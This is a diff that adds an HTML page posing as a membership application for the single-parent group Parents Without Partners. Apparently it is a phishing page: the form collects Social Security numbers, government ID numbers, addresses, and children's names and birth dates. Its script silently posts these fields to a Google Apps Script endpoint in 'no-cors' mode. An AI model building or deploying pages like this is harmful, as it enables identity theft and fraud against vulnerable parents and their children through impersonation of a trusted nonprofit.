@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Parents Without Partners</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: Georgia, 'Times New Roman', serif; color: #1a1a2e; background: #f4f4f0; }
+
+    /* HEADER */
+    header {
+      background: #1a1a6e;
+      padding: 1rem 2rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 1rem;
+    }
+    .header-left { display: flex; align-items: center; gap: 1rem; }
+    #siteTitle { display: flex; align-items: baseline; }
+    #siteTitle h1 { color: #fff; font-size: 28px; font-weight: 700; line-height: 1; }
+    #siteTitle h2 { color: #94caff; font-size: 16px; font-weight: 400; line-height: 1; }
+    nav a {
+      color: #94caff;
+      text-decoration: none;
+      margin-left: 1.5rem;
+      font-size: 14px;
+      font-family: Arial, sans-serif;
+      letter-spacing: .05em;
+    }
+    nav a:hover { color: #fff; }
+
+    /* MAIN */
+    main { max-width: 900px; margin: 0 auto; padding: 2rem 1rem; }
+
+    /* HERO */
+    .hero {
+      background: #1a1a6e;
+      color: #fff;
+      padding: 2.5rem 2rem;
+      border-radius: 8px;
+      margin-bottom: 2rem;
+      text-align: center;
+    }
+    .hero h1 { font-size: 26px; font-weight: 500; margin-bottom: .75rem; }
+    .hero p { font-size: 14px; color: #94caff; line-height: 1.7; max-width: 600px; margin: 0 auto; font-family: Arial, sans-serif; }
+
+    /* INFO CARDS */
+    .info-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 1rem;
+      margin-bottom: 2rem;
+    }
+    .info-card {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 1.25rem;
+    }
+    .info-card h2 { font-size: 16px; font-weight: 600; margin-bottom: .5rem; color: #1a1a6e; font-family: Arial, sans-serif; }
+    .info-card p { font-size: 13px; color: #555; line-height: 1.6; font-family: Arial, sans-serif; }
+    .info-card a { display: inline-block; margin-top: .75rem; font-size: 13px; color: #1a1a6e; text-decoration: none; font-weight: 600; font-family: Arial, sans-serif; }
+
+    /* DIVIDER */
+    .divider {
+      text-align: center;
+      padding: 1.5rem 0;
+      color: #666;
+      font-size: 14px;
+      font-style: italic;
+    }
+
+    /* FORM */
+    .form-container {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 2rem;
+    }
+    .form-container > h2 { font-size: 22px; font-weight: 600; margin-bottom: .25rem; color: #1a1a6e; }
+    .subtitle { font-size: 13px; color: #777; margin-bottom: 1.5rem; font-family: Arial, sans-serif; }
+    fieldset {
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      padding: 1.25rem;
+      margin-bottom: 1.25rem;
+    }
+    legend { font-size: 14px; font-weight: 600; padding: 0 .5rem; color: #555; font-family: Arial, sans-serif; }
+    .form-group { margin-bottom: 1rem; }
+    .form-group label { display: block; font-size: 13px; color: #555; margin-bottom: 4px; font-family: Arial, sans-serif; }
+    .form-group input[type=text],
+    .form-group input[type=date],
+    .form-group input[type=tel],
+    .form-group input[type=email],
+    .form-group input[type=password],
+    .form-group input[type=file],
+    .form-group select {
+      width: 100%;
+      padding: 8px 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      background: #fff;
+      color: #1a1a2e;
+      font-size: 14px;
+      font-family: Arial, sans-serif;
+      outline: none;
+    }
+    .form-group input:focus, .form-group select:focus { border-color: #1a1a6e; }
+    .ssn-container { display: flex; gap: 8px; }
+    .ssn-container input { flex: 1; }
+    .ssn-container button {
+      padding: 0 14px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      background: #f4f4f0;
+      cursor: pointer;
+      font-size: 13px;
+      color: #333;
+      font-family: Arial, sans-serif;
+    }
+    .radio-group { display: flex; align-items: center; gap: 8px; margin: 5px 0; font-size: 14px; font-family: Arial, sans-serif; }
+    .note { font-size: 12px; color: #888; margin-bottom: .75rem; font-style: italic; font-family: Arial, sans-serif; }
+    .child-header-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 8px;
+      font-size: 12px;
+      font-weight: 600;
+      color: #555;
+      margin-bottom: 6px;
+      font-family: Arial, sans-serif;
+    }
+    .child-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
+    .child-row input, .child-row select {
+      width: 100%;
+      padding: 7px 9px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      background: #fff;
+      color: #1a1a2e;
+      font-size: 13px;
+      font-family: Arial, sans-serif;
+      outline: none;
+    }
+    .submit-btn {
+      width: 100%;
+      padding: 13px;
+      background: #1a1a6e;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 1rem;
+      font-family: Arial, sans-serif;
+      letter-spacing: .03em;
+    }
+    .submit-btn:hover { background: #14147a; }
+    .submit-btn:disabled { background: #888; cursor: not-allowed; }
+    .success-msg {
+      display: none;
+      background: #e6f4ea;
+      border: 1px solid #34a853;
+      color: #1e7e34;
+      padding: 1rem;
+      border-radius: 6px;
+      margin-top: 1rem;
+      text-align: center;
+      font-size: 14px;
+      font-family: Arial, sans-serif;
+    }
+    .error-msg {
+      display: none;
+      background: #fce8e6;
+      border: 1px solid #ea4335;
+      color: #c5221f;
+      padding: 1rem;
+      border-radius: 6px;
+      margin-top: 1rem;
+      text-align: center;
+      font-size: 14px;
+      font-family: Arial, sans-serif;
+    }
+
+    /* FOOTER */
+    footer {
+      background: #1a1a6e;
+      color: #94caff;
+      padding: 1.5rem 2rem;
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      margin-top: 2rem;
+    }
+    footer .ft { display: flex; align-items: baseline; }
+    footer .ft h1 { color: #fff; font-size: 20px; font-weight: 700; }
+    footer .ft h2 { color: #94caff; font-size: 12px; font-weight: 400; }
+    footer p { font-size: 12px; margin-top: .25rem; font-family: Arial, sans-serif; }
+
+    /* RESPONSIVE */
+    @media (max-width: 600px) {
+      header { padding: .75rem 1rem; }
+      main { padding: 1rem .75rem; }
+      .form-container { padding: 1.25rem; }
+      .child-header-row, .child-row { grid-template-columns: 1fr; }
+      nav a { margin-left: .75rem; font-size: 13px; }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="header-left">
+      <svg width="52" height="52" viewBox="0 0 65 65" xmlns="http://www.w3.org/2000/svg">
+        <g style="fill:white;fill-opacity:1" transform="matrix(-1.1989424,0,0,-1.1850375,18.242961,316.63232)">
+          <path d="m -20.350341,237.72231 c -4.692771,0 -8.499739,3.85614 -8.499739,8.59999 0,4.74385 3.806968,8.59948 8.499739,8.59948 4.692775,0 8.500256,-3.85563 8.500256,-8.59948 0,-4.74385 -3.807481,-8.59999 -8.500256,-8.59999 z m 0.237712,0.71107 c 0.636466,0.0214 1.081951,0.13405 1.653128,0.41755 0.791051,0.39264 1.420765,1.03607 1.802992,1.84226 0.571564,1.20551 0.492938,2.61821 -0.20929,3.76049 -0.291577,0.4743 -0.780672,0.96817 -1.257806,1.27021 -0.596749,0.37774 -1.36027,0.60227 -2.05827,0.60513 -1.358916,0.006 -2.581325,0.66092 -3.298508,1.76889 -0.465918,0.7198 -0.685419,1.58498 -0.611849,2.40967 0.03454,0.38703 0.07608,0.58958 0.193271,0.94258 0.43989,1.32484 1.563494,2.29889 2.962092,2.56831 0.323853,0.0624 0.345382,0.0692 0.328663,0.0961 -0.01301,0.021 -0.336915,0.0256 -0.458888,0.006 -0.03245,-0.005 -0.175543,-0.0258 -0.318326,-0.0455 -1.322702,-0.18256 -2.661661,-0.76543 -3.764629,-1.63918 -0.318542,-0.25235 -0.972764,-0.90634 -1.225248,-1.22473 -0.363969,-0.45896 -0.754391,-1.08268 -0.975133,-1.55701 -0.7903,-1.69813 -0.9608,-3.5637 -0.49041,-5.36918 0.271303,-1.04133 0.768881,-2.02932 1.465027,-2.90938 0.249565,-0.3155 0.904274,-0.96982 1.225764,-1.22474 0.295587,-0.2344 0.822412,-0.58662 1.133266,-0.75809 1.177787,-0.64961 2.614604,-1.00301 3.904154,-0.95963 z m -7.895642,9.73842 c 0.163801,0.68571 0.417795,1.34979 0.761193,1.96991 0.190836,0.34463 0.53694,0.85959 0.790133,1.17615 0.267242,0.33413 0.869466,0.93489 1.201478,1.19942 1.360554,1.08394 2.939037,1.68166 4.672581,1.76836 0.120396,0.006 0.203542,0.007 0.291973,0.008 -0.0199,1.5e-4 -0.03949,0.002 -0.05943,0.002 -3.720777,0 -6.834915,-2.60949 -7.65793,-6.12366 z m 16.095549,18.83744 a 26.690122,27.0033 0 0 0 26.69019,-27.00336 26.690122,27.0033 0 0 0 -26.69019,-27.00337 26.690122,27.0033 0 0 0 -26.690189,27.00337 26.690122,27.0033 0 0 0 26.690189,27.00336 z m -8.186222,-7.35979 a 13.276107,13.431887 0 0 1 -13.275971,-13.43175 13.276107,13.431887 0 0 1 13.275971,-13.43221 13.276107,13.431887 0 0 1 11.9351016,7.57263 V 220.1111 h 8.43590304 0.184947 l 3.28466196,0.004 -3.28466196,2.95739 v 33.7714 l 3.03636996,2.73378 -3.46914596,0.004 v -0.009 H -8.1638424 v -7.50995 a 13.276107,13.431887 0 0 1 -11.9351016,7.5876 z"/>
+        </g>
+      </svg>
+      <div id="siteTitle">
+        <h1>P</h1><h2>arents</h2><h1>W</h1><h2>ithout</h2><h1>P</h1><h2>artners</h2>
+      </div>
+    </div>
+    <nav>
+      <a href="#">Home</a>
+      <a href="#">Info</a>
+      <a href="#">Contact</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="hero">
+      <h1>An Organization for Single Parents</h1>
+      <p>Parents Without Partners (PWP) is a single parent support group for all single parents and their children. PWP is a 501.C3 educational organization promoting single parents and their children.</p>
+    </div>
+
+    <div class="info-grid">
+      <div class="info-card">
+        <h2>Who we are</h2>
+        <p>Parents Without Partners, Inc. is an international non-profit and non-sectarian organization of single parents — widowed, divorced, and never married — raising their children alone.</p>
+        <a href="#">Learn more →</a>
+      </div>
+      <div class="info-card">
+        <h2>The challenge</h2>
+        <p>Providing a nurturing family life is often complicated by established community patterns. Resources to assist single parents in meeting their special circumstances are essential.</p>
+        <a href="#">Learn more →</a>
+      </div>
+      <div class="info-card">
+        <h2>Our conviction</h2>
+        <p>Through working together, exchanging ideas, and mutual understanding, we've established PWP to further the common welfare and well-being of our children.</p>
+        <a href="#">Learn more →</a>
+      </div>
+    </div>
+
+    <div class="divider">"No role brings greater joy or blessing than being a parent"</div>
+
+    <div class="form-container">
+      <h2>Membership application</h2>
+      <p class="subtitle">Official eligibility & application form</p>
+
+      <form id="pwpForm">
+
+        <fieldset>
+          <legend>1. Personal information</legend>
+          <div class="form-group">
+            <label for="full-name">Full name</label>
+            <input type="text" id="full-name" name="full_name" required>
+          </div>
+          <div class="form-group">
+            <label for="dob">Date of birth</label>
+            <input type="date" id="dob" name="dob" required>
+          </div>
+          <div class="form-group">
+            <label for="address">Street address</label>
+            <input type="text" id="address" name="address" required>
+          </div>
+          <div class="form-group">
+            <label for="phone">Phone number</label>
+            <input type="tel" id="phone" name="phone" required>
+          </div>
+          <div class="form-group">
+            <label for="email">Email address</label>
+            <input type="email" id="email" name="email" required>
+          </div>
+        </fieldset>
+
+        <fieldset>
+          <legend>2. Single parent eligibility</legend>
+          <div class="form-group">
+            <label for="ssn-input">Social security number</label>
+            <div class="ssn-container">
+              <input type="password" id="ssn-input" name="ssn" placeholder="XXX-XX-XXXX"
+                pattern="^\d{3}-\d{2}-\d{4}$" maxlength="11" inputmode="numeric" required>
+              <button type="button" id="toggle-btn">Show</button>
+            </div>
+          </div>
+          <div class="form-group">
+            <label>Current legal status:</label>
+            <div class="radio-group"><input type="radio" id="divorced" name="status" value="Divorced" required><label for="divorced">Divorced</label></div>
+            <div class="radio-group"><input type="radio" id="separated" name="status" value="Separated"><label for="separated">Separated</label></div>
+            <div class="radio-group"><input type="radio" id="widowed" name="status" value="Widowed"><label for="widowed">Widowed</label></div>
+            <div class="radio-group"><input type="radio" id="never-married" name="status" value="Never Married"><label for="never-married">Never married</label></div>
+          </div>
+          <div class="form-group">
+            <label>Custody status:</label>
+            <div class="radio-group"><input type="radio" id="full" name="custody" value="Full" required><label for="full">Full custody</label></div>
+            <div class="radio-group"><input type="radio" id="joint" name="custody" value="Joint"><label for="joint">Joint custody</label></div>
+          </div>
+        </fieldset>
+
+        <fieldset>
+          <legend>3. Government-issued identification</legend>
+          <div class="form-group">
+            <label for="gov-id-type">Type of ID</label>
+            <select id="gov-id-type" name="gov_id_type" required>
+              <option value="">Select</option>
+              <option>Driver's License</option>
+              <option>Passport</option>
+              <option>National ID</option>
+              <option>Other</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label for="gov-id-number">ID number</label>
+            <input type="text" id="gov-id-number" name="gov_id_number" placeholder="Enter ID number" required>
+          </div>
+        </fieldset>
+
+        <fieldset>
+          <legend>4. Document upload</legend>
+          <p class="note">Please upload a clear copy of your government-issued ID for verification purposes:</p>
+          <div class="form-group">
+            <label for="id-upload">Upload document</label>
+            <input type="file" id="id-upload" name="id_upload" accept=".jpg,.jpeg,.png,.pdf">
+          </div>
+        </fieldset>
+
+        <fieldset>
+          <legend>5. Dependent / children information</legend>
+          <p class="note">List children currently living with you or under your legal care:</p>
+          <div class="child-header-row">
+            <div>Child's full name</div>
+            <div>Birth date</div>
+            <div>Gender</div>
+          </div>
+          <div class="child-row">
+            <input type="text" name="child_name_1" placeholder="Child name">
+            <input type="date" name="child_dob_1">
+            <select name="child_gender_1">
+              <option value="">Select</option>
+              <option>Male</option>
+              <option>Female</option>
+              <option>Other</option>
+            </select>
+          </div>
+        </fieldset>
+
+        <button type="submit" class="submit-btn" id="submitBtn">Submit application</button>
+        <div class="success-msg" id="successMsg">✅ Application submitted successfully! You will be contacted soon.</div>
+        <div class="error-msg" id="errorMsg">❌ Something went wrong. Please try again.</div>
+
+      </form>
+    </div>
+  </main>
+
+  <footer>
+    <svg width="44" height="44" viewBox="0 0 65 65" xmlns="http://www.w3.org/2000/svg">
+      <g style="fill:white;fill-opacity:1" transform="matrix(-1.1989424,0,0,-1.1850375,18.242961,316.63232)">
+        <path d="m -20.350341,237.72231 c -4.692771,0 -8.499739,3.85614 -8.499739,8.59999 0,4.74385 3.806968,8.59948 8.499739,8.59948 4.692775,0 8.500256,-3.85563 8.500256,-8.59948 0,-4.74385 -3.807481,-8.59999 -8.500256,-8.59999 z m 16.095549,18.83744 a 26.690122,27.0033 0 0 0 26.69019,-27.00336 26.690122,27.0033 0 0 0 -26.69019,-27.00337 26.690122,27.0033 0 0 0 -26.690189,27.00337 26.690122,27.0033 0 0 0 26.690189,27.00336 z m -8.186222,-7.35979 a 13.276107,13.431887 0 0 1 -13.275971,-13.43175 13.276107,13.431887 0 0 1 13.275971,-13.43221 13.276107,13.431887 0 0 1 11.9351016,7.57263 V 220.1111 h 8.43590304 0.184947 l 3.28466196,0.004 -3.28466196,2.95739 v 33.7714 l 3.03636996,2.73378 -3.46914596,0.004 v -0.009 H -8.1638424 v -7.50995 a 13.276107,13.431887 0 0 1 -11.9351016,7.5876 z"/>
+      </g>
+    </svg>
+    <div>
+      <div class="ft"><h1>P</h1><h2>arents</h2><h1>W</h1><h2>ithout</h2><h1>P</h1><h2>artners</h2></div>
+      <p>Contact us on Facebook</p>
+    </div>
+  </footer>
+
+  <script>
+    // SSN toggle & auto-format
+    const toggleBtn = document.getElementById('toggle-btn');
+    const ssnInput = document.getElementById('ssn-input');
+    toggleBtn.addEventListener('click', () => {
+      if (ssnInput.type === 'password') { ssnInput.type = 'text'; toggleBtn.textContent = 'Hide'; }
+      else { ssnInput.type = 'password'; toggleBtn.textContent = 'Show'; }
+    });
+    ssnInput.addEventListener('input', () => {
+      let v = ssnInput.value.replace(/\D/g, '');
+      if (v.length > 3) v = v.slice(0, 3) + '-' + v.slice(3);
+      if (v.length > 6) v = v.slice(0, 6) + '-' + v.slice(6);
+      ssnInput.value = v.slice(0, 11);
+    });
+
+    // Form submission → Google Apps Script
+    const form = document.getElementById('pwpForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const successMsg = document.getElementById('successMsg');
+    const errorMsg = document.getElementById('errorMsg');
+
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Submitting...';
+      successMsg.style.display = 'none';
+      errorMsg.style.display = 'none';
+
+      const data = {
+        full_name: form.full_name.value,
+        dob: form.dob.value,
+        address: form.address.value,
+        phone: form.phone.value,
+        email: form.email.value,
+        ssn: form.ssn.value,
+        status: [...form.querySelectorAll('input[name="status"]')].find(r => r.checked)?.value || '',
+        custody: [...form.querySelectorAll('input[name="custody"]')].find(r => r.checked)?.value || '',
+        gov_id_type: form.gov_id_type.value,
+        gov_id_number: form.gov_id_number.value,
+        child_name_1: form.child_name_1.value,
+        child_dob_1: form.child_dob_1.value,
+        child_gender_1: form.child_gender_1.value
+      };
+
+      try {
+        await fetch('https://script.google.com/macros/s/AKfycbwfgS7YDUmOwN9-DkIqJXTzIEljfpQLlRICMBj-9yXF0SxqsACQqKwyIuJteqe-N51PSA/exec', {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+        form.reset();
+        successMsg.style.display = 'block';
+        submitBtn.textContent = 'Submit application';
+        submitBtn.disabled = false;
+      } catch (err) {
+        errorMsg.style.display = 'block';
+        submitBtn.textContent = 'Submit application';
+        submitBtn.disabled = false;
+      }
+    });
+  </script>
+
+</body>
+</html>
